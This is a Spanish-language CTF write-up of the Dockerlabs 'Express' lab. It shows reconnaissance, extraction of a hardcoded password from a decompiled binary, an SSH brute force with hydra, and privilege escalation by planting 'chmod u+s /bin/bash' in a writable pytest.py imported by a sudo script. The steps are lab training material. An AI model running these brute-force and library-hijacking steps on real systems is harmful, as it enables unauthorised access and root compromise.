
# Writeup Template: Maquina `[ Express ]`

- Tags: #Express
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Express](https://mega.nz/file/2AFz0KAa#fSt3-TDTnPf8NpeEQ_0mhhRwA2pWrwPSML2ctJmw6Ms) Laboratorio enfocado en explotación de aplicaciones Express.js y Node.js.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x express.zip
sudo bash auto_deploy.sh express.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```

### Interceptando Peticion
Tenemos un pequeno formulario que interceptaremos para ver como es que se esta enviando la data:
Lanzamos **burpsuite**
```bash
burpsuite &>/dev/null & disown
```

Tenemos la peticion interceptada pero no nos indica nada
```burpsuite
GET /index.html? HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2/index.html
Upgrade-Insecure-Requests: 1
Priority: u=0, 
```
No encontramos nada interesante
Procedemos a agregar el nombre de la maquina a nuestro archivo **( /etc/host )**
```bash
172.17.0.2 express.dl
```

Ahora tenemos una web en la siguiente direccion URL
```bash
http://express.dl/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://express.dl
http://express.dl [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Script, Title[Correos Express - Envíos Rápidos y Seguros]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p80 express.dl
```

Reporte:
```bash
/robots.txt: Robots file
/binary/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```

Tenemos el archivo **robots.txt** es un estándar web (RFC 9309) que indica a los rastreadores (como Googlebot) qué partes de un sitio **no deben ser indexadas o accedidas**. Se ubica siempre en la raíz del dominio:  
```bash
http://<dominio>/robots.txt
```

Ahora si con curl realizamos la peticon para ver su contenido:
```bash
curl -s -X GET http://express.dl/robots.txt
#################################################
#                   ROBOTS                      #
#################################################

disable: binary/*
disable: secret/note.txt
```

### Descubrimiento de Rutas
```bash
gobuster dir -u http://express.dl -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
http://express.dl/binary/
```
### Descubrimiento de Archivos
```bash
gobuster dir -u http://express.dl -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 2723]
/javascript           (Status: 301) [Size: 313] [--> http://express.dl/javascript/]
/script.js            (Status: 200) [Size: 186]
/robots.txt           (Status: 200) [Size: 162]
/binary               (Status: 301) [Size: 309] [--> http://express.dl/binary/]
```

Si ingresamoa a la siguiente ruta:
```bash
http://express.dl/binary/
```

Tenemos un archivo llamado **game** que lo descargamos en nuestra maquina, Revisando el tipo de archivo vemos que es un ejecutable:
```bash
file game
game: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1fc8229bf4b0a5e4513a133e5ce793e3720fcec2, for GNU/Linux 3.2.0, not stripped
```

Primero usaremos **ghidra** para intentar revisar el codigo fuente:
Lanzamos **ghidra**
```bash
ghidra &>/dev/null & disown
```

Una ves creado un nuevo proyecto, Procedemos a importar el binario **game**, Para despues filtrar por la funcion **main** para ver como es que esta programado:
Revisando al funcion **main** vemos que esta realizando una llamada a una funcion **hidden_key**
```c
undefined8 main(void)

{
  int iVar1;
  time_t tVar2;
  int local_14;
  int local_10;
  int local_c;
  
  local_c = 0;
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  puts(&DAT_00102050);
  printf(&DAT_00102080,100);
  for (; local_c < 100; local_c = local_c + 1) {
    iVar1 = rand();
    local_10 = iVar1 % 100 + 1;
    printf(&DAT_001020d8,(ulong)(local_c + 1),100);
    while( true ) {
      while( true ) {
        __isoc99_scanf(&DAT_00102102,&local_14);
        if (local_10 <= local_14) break;
        printf(&DAT_00102108);
      }
      if (local_14 <= local_10) break;
      printf(&DAT_00102138);
    }
    puts(&DAT_00102168);
  }
  hidden_key();
  return 0;
```

Si le damos doble click a la funcion **hidden_key** para que nos lleve, Vemos lo siguiente:
```c
void hidden_key(void)

{
  char local_28 [28];
  uint local_c;
  
  builtin_strncpy(local_28,"P@ssw0rd!#--025163fhusGNFE",0x1a);
  puts(&DAT_00102008);
  printf("La clave secreta es: ");
  for (local_c = 0; local_c < 0x1a; local_c = local_c + 1) {
    putchar((int)local_28[(int)local_c]);
  }
  putchar(10);
  return;
}
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos algo interesante al parecer tenemos una passoword valida:
```c
builtin_strncpy(local_28,"P@ssw0rd!#--025163fhusGNFE",0x1a);
```
### Ejecucion del Ataque
Ahora como no tenemos un indicio de ningun usuario valido para es sistema, y como en la web no existe ningun login, Sabiendo que esta expuesto el servicio **ssh** procedemos a realizar un ataque de fuerza bruta a ese servicio usarmos como parametro la contrasena obtenida
```bash
# Comandos para explotación
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p 'P@ssw0rd!#--025163fhusGNFE' -t 4 -f ssh://172.17.0.2
```

Tenemos credenciales validas:
```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: admin   password: P@ssw0rd!#--025163fhusGNFE
```
### Intrusion
Procedemoa a ganar acceso a el objetivo por ssh
```bash
# Reverse shell o acceso inicial
ssh admin@172.17.0.2 # ( P@ssw0rd!#--025163fhusGNFE )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Enumerando usuarios del sistema, El objetivo es **root**
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
admin:x:1001:1001:admin,,,:/home/admin:/bin/bas
```
### Explotacion de Privilegios

###### Usuario `[ admin ]`:
Listando los permisos para este usaurio tenemos lo siguiente:
```bash
sudo -l

User admin may run the following commands on 2ecb8edce2fe:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

Si revismaos el contenido del script de python
```python
cat script.py 
import os
import random
import time
import pytest

# Configuración de la pantalla
ROWS, COLUMNS = os.get_terminal_size()
DELAY = 0.05

def generate_column():
    """Genera una columna aleatoria de caracteres."""
    return [random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()") for _ in range(ROWS)]

def draw_rain(columns):
    """Dibuja las columnas de caracteres en la pantalla."""
    #os.system('cls' if os.name == 'nt' else 'clear')  # Limpia la pantalla
    for col in zip(*columns):
        print("".join(col))
    time.sleep(DELAY)

def main():
    # Crear columnas aleatorias
    columns = [generate_column() for _ in range(COLUMNS)]

    while True:
        # Desplaza las columnas hacia abajo
        for col in columns:
            col.insert(0, random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"))
            col.pop()
        draw_rain(columns)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAnimación terminada.")
```

Lo que podemos hacer es, Intentar secuestrar la una libreria de python: Para eso nos dirigimos al directorio **/tmp** para poder crear un banario malicioso de la libreria **random**
```bash
cat random.py 

import os
os.system("chmod u+s /bin/bash")
```

Ahora damos permisos de ejecucion a nuestro binario malicioso:
```bash
chmod +x os.py
```

Ahora sabiendo que podemos ejecutar un script en la ruta **/opt** que al ejecutarse importa la libreria **os** y ejecuta el codigo, Nos aprovechamos de esto para que sea ejecutada nuestra libreria maliciosa, ya que python en su **PATH** primer busca en nuestro directorio actual de trabajo:
```bash
sudo -u root /usr/bin/python3 /opt/script.py
```

No logramos que se modifiquen los permisos, pero podemos revisar si alguna de estas librerias tiene permisos de escritura para cargarle una instruccion maliciosa
```bash
find / -type f -iname "os.py" -ls 2>/dev/null
  7090909     40 -rw-r--r--   1 root     root        39786 Nov  6  2024 /usr/lib/python3.12/os.py
```

Tenemos esta libreria, que en grupo nos pertenece asi que nos podemos aprovechar de esto:
```bash
find / -type f -iname "pytest.py" -ls 2>/dev/null
  7090927      4 -rwxrwxr-x   1 root     admin           1 Jan 10  2025 /usr/lib/python3.12/pytest.py
```

Ahora podemos color instrucciones maliciosas:
```bash
nano pytest.py 

import os
os.system("chmod u+s /bin/bash")
```

Ahora volvemos a intentar explotar el privilegio:
```bash
sudo -u root /usr/bin/python3 /opt/script.py
```

hemos logrado de manera exitosa los permisos **SUID** en el bianrio **bash**
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
admin@2ecb8edce2fe:/usr/lib/python3.12$ bash -p
```

---

## Evidencia de Compromiso
Flags de root:
```bash
ls -la /root
-rw-r--r--  1 root root   33 Jan 10  2025 root.txt
```

```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```